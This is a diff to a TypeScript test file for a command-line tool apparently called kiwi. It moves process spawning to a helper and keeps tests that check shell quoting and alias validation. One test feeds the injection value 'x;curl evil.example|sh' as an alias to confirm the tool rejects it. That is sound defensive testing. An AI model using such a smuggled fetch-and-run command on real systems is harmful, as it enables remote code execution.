@@ -5,6 +5,7 @@ import { join } from "node:path";
 import { loadConfig } from "../src/config.ts";
 import { mcFor } from "../src/hooks.ts";
 import { asOption, channelOption } from "@kiwi/core/wake.ts";
+import { spawnOwned } from "./owned.ts";
 
 const home = mkdtempSync(join(tmpdir(), "kiwi-alias-home-"));
 const dir = mkdtempSync(join(tmpdir(), "kiwi-alias-dir-"));
@@ -28,7 +29,7 @@ test("the command an agent is told to type quotes its channel and name as shell 
 test("a channel or name that starts with a dash reaches kiwi as that channel and name, through a shell", async () => {
   const cli = join(import.meta.dir, "../src/cli/main.ts");
   const line = `exec ${process.execPath} ${cli} ${channelOption("--help")} ${asOption("-x")} status`;
-  const p = Bun.spawn(["/bin/sh", "-c", line], { env: { ...process.env, KIWI_HOME: home }, cwd: dir, stdout: "pipe", stderr: "pipe" });
+  const p = spawnOwned(["/bin/sh", "-c", line], { env: { ...process.env, KIWI_HOME: home }, cwd: dir, stdout: "pipe", stderr: "pipe" });
   const err = await new Response(p.stderr).text();
   expect(await p.exited).not.toBe(0);
   expect(err).toContain(`unknown channel "--help"`);
@@ -36,7 +37,7 @@ test("a channel or name that starts with a dash reaches kiwi as that channel and
 
 test("kiwi join refuses an alias that isn't a name, before it reaches the relay", async () => {
   const code = `mc2-${"A".repeat(22)}-${"A".repeat(16)}`;
-  const p = Bun.spawn([process.execPath, join(import.meta.dir, "../src/cli/main.ts"), "join", code, "x;curl evil.example|sh", "--as", "mac"], {
+  const p = spawnOwned([process.execPath, join(import.meta.dir, "../src/cli/main.ts"), "join", code, "x;curl evil.example|sh", "--as", "mac"], {
     env: { ...process.env, KIWI_HOME: home, KIWI_RELAY: "http://127.0.0.1:9" },
     cwd: dir,
     stdout: "pipe",
